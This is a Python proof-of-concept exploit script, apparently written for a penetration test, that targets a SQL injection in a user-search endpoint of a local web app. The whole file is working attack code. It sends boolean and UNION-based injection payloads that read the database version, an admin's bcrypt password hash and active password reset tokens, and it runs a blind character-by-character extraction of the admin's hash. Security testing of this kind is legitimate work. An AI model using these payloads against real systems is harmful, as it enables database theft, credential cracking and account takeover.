#!/usr/bin/env python3
"""
WSTG-INPV-05: SQL Injection in User Search

Vulnerability: GET /api/users?search= is vulnerable to SQL injection via
direct string concatenation in users.service.js line 33:

    query += ` AND (display_name ILIKE '%${search}%' OR email ILIKE '%${search}%' OR username ILIKE '%${search}%')`;

The 'search' parameter is interpolated directly into the SQL query without
parameterization or sanitization. This allows an attacker to inject arbitrary
SQL and extract sensitive data from the database.

The injection point is inside ILIKE '%...%', so payloads must close the
quote and parenthesis properly. For example:
    search = test%' OR true OR username ILIKE '%
This produces valid SQL that returns all users.

Impact: Full database read access. Attacker can extract password hashes,
tokens, PII, and any other data in the PostgreSQL database.
"""

import requests
import sys
import time

BASE_URL = "http://localhost:3000"


def sqli_search(payload):
    """Send a search query with the given SQLi payload."""
    resp = requests.get(f"{BASE_URL}/api/users", params={"search": payload})
    return resp


def main():
    print("=" * 70)
    print("WSTG-INPV-05: SQL Injection in GET /api/users?search=")
    print("=" * 70)

    # Step 1: Normal search to confirm endpoint works
    print("\n[1] Normal search to confirm endpoint works...")
    resp = sqli_search("test")
    print(f"    Status: {resp.status_code}")
    data = resp.json()
    normal_count = data.get("pagination", {}).get("total", 0)
    print(f"    Users found for 'test': {normal_count}")

    # Step 2: SQLi - always-true condition
    # The injection is inside: ILIKE '%${search}%'
    # Payload closes the quote, adds OR true, then reopens for the remaining %'
    print("\n[2] Testing always-true SQLi...")
    payload_true = "x%' OR true OR username ILIKE '%"
    resp_true = sqli_search(payload_true)
    print(f"    Payload: {payload_true}")
    print(f"    Status: {resp_true.status_code}")
    if resp_true.status_code == 200:
        count_true = resp_true.json().get("pagination", {}).get("total", 0)
        print(f"    Users returned: {count_true}")
        if count_true > normal_count:
            print(f"    [CONFIRMED] Returned MORE users than normal search ({count_true} vs {normal_count})")
    else:
        print(f"    Error: {resp_true.text[:200]}")
        count_true = 0

    # Step 3: Always-false condition
    print("\n[3] Testing always-false SQLi...")
    payload_false = "x%' AND false AND username ILIKE '%"
    resp_false = sqli_search(payload_false)
    print(f"    Payload: {payload_false}")
    print(f"    Status: {resp_false.status_code}")
    if resp_false.status_code == 200:
        count_false = resp_false.json().get("pagination", {}).get("total", 0)
        print(f"    Users returned: {count_false}")
    else:
        count_false = -1

    if count_true > 0 and count_false == 0:
        print(f"\n    [CONFIRMED] Boolean-based blind SQLi works!")
        print(f"    TRUE: {count_true} users  |  FALSE: {count_false} users")

    # Step 4: UNION-based SQLi to extract database version
    print("\n[4] Attempting UNION-based SQLi to extract database version...")
    # The main query selects 9 columns:
    # id, username, display_name, role, avatar_url, bio, location, skills, created_at
    # We need to match this with our UNION
    union_payload = (
        "x%' AND false AND username ILIKE '%"
        "') UNION SELECT version(),'u','v','w','x','y','z','[]'::jsonb,now() --"
    )
    resp_union = sqli_search(union_payload)
    print(f"    Status: {resp_union.status_code}")
    if resp_union.status_code == 200:
        users = resp_union.json().get("users", [])
        for u in users:
            uid = str(u.get("id", ""))
            if "PostgreSQL" in uid:
                print(f"    [VULNERABLE] Extracted DB version via UNION:")
                print(f"    {uid[:120]}")
                break
        else:
            # Try to see what was returned
            if users:
                print(f"    Returned {len(users)} rows, first id: {users[0].get('id','?')[:80]}")
    else:
        print(f"    Status: {resp_union.status_code}")
        # Try with text cast for skills column
        union_payload2 = (
            "x%' AND false AND username ILIKE '%"
            "') UNION SELECT version(),'u','v','w','x','y','z','skills',now()::text --"
        )
        resp_union2 = sqli_search(union_payload2)
        print(f"    Alt attempt status: {resp_union2.status_code}")
        if resp_union2.status_code == 200:
            users2 = resp_union2.json().get("users", [])
            if users2:
                print(f"    [VULNERABLE] Extracted: {users2[0].get('id','?')[:120]}")

    # Step 5: Extract password hash via UNION
    print("\n[5] Extracting admin password hash via UNION SQLi...")
    hash_payload = (
        "x%' AND false AND username ILIKE '%"
        "') UNION SELECT password_hash,email,'v','w','x','y','z','[]'::jsonb,now() "
        "FROM users WHERE email='alice.admin@hireflow.com' --"
    )
    resp_hash = sqli_search(hash_payload)
    print(f"    Status: {resp_hash.status_code}")
    if resp_hash.status_code == 200:
        users = resp_hash.json().get("users", [])
        if users:
            hash_val = users[0].get("id", "")
            email_val = users[0].get("username", "")
            print(f"    [VULNERABLE] Extracted password hash for admin!")
            print(f"    Email (via username col): {email_val}")
            print(f"    Hash (via id col): {hash_val[:60]}...")
            if hash_val.startswith("$2"):
                print(f"    Confirmed bcrypt hash format!")
    else:
        print(f"    Error: {resp_hash.text[:200]}")

    # Step 6: Extract reset tokens
    print("\n[6] Extracting password reset tokens via UNION SQLi...")
    token_payload = (
        "x%' AND false AND username ILIKE '%"
        "') UNION SELECT COALESCE(reset_token,'none'),email,'v','w','x','y','z','[]'::jsonb,now() "
        "FROM users WHERE reset_token IS NOT NULL LIMIT 5 --"
    )
    resp_tokens = sqli_search(token_payload)
    print(f"    Status: {resp_tokens.status_code}")
    if resp_tokens.status_code == 200:
        users = resp_tokens.json().get("users", [])
        if users:
            print(f"    [VULNERABLE] Found {len(users)} users with active reset tokens!")
            for u in users[:3]:
                token = u.get("id", "N/A")
                email = u.get("username", "N/A")
                print(f"    - {email}: token={token[:30]}...")
        else:
            print("    No users with active reset tokens found.")

    # Step 7: Boolean-based blind SQLi to extract first char of password hash
    print("\n[7] Boolean-based blind SQLi: extracting password hash character by character...")
    target_email = "alice.admin@hireflow.com"
    extracted = ""

    # bcrypt hash charset: $, digits, letters, dots, slashes
    charset = "$0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./"

    for pos in range(1, 14):
        found = False
        for c in charset:
            payload = (
                f"x%' AND (SELECT SUBSTRING(password_hash,{pos},1) "
                f"FROM users WHERE email='{target_email}')='{c}' "
                f"AND username ILIKE '%"
            )
            resp = sqli_search(payload)
            if resp.status_code == 200:
                count = resp.json().get("pagination", {}).get("total", 0)
                if count > 0:
                    extracted += c
                    found = True
                    break
        if not found:
            extracted += "?"
        sys.stdout.write(f"\r    Extracted so far: {extracted}")
        sys.stdout.flush()

    print(f"\n    Password hash prefix: {extracted}")
    if extracted.startswith("$2"):
        print("    [CONFIRMED] Successfully extracted bcrypt hash prefix via blind SQLi!")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: SQL Injection confirmed in GET /api/users?search=")
    print("  - String concatenation in users.service.js line 33")
    print("  - Boolean-based blind SQLi extracts data char by char")
    print("  - UNION-based SQLi extracts full password hashes, tokens")
    print("  - Full database read access achieved without authentication")
    print("=" * 70)


if __name__ == "__main__":
    main()
